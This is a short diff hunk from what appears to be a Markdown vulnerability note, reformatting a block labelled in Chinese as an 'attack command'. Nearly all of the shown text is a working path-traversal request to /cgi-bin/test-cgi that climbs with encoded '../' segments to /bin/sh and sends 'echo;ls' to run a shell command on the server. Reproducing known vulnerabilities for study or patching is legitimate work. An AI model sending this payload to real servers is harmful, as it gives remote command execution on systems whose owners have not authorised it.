@@ -10,7 +10,9 @@
 
 ![alt text](image.png)
 
-```攻击命令 POST
+攻击命令
+
+``` sh
 /cgi-bin/test-cgi/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
 
 echo;ls
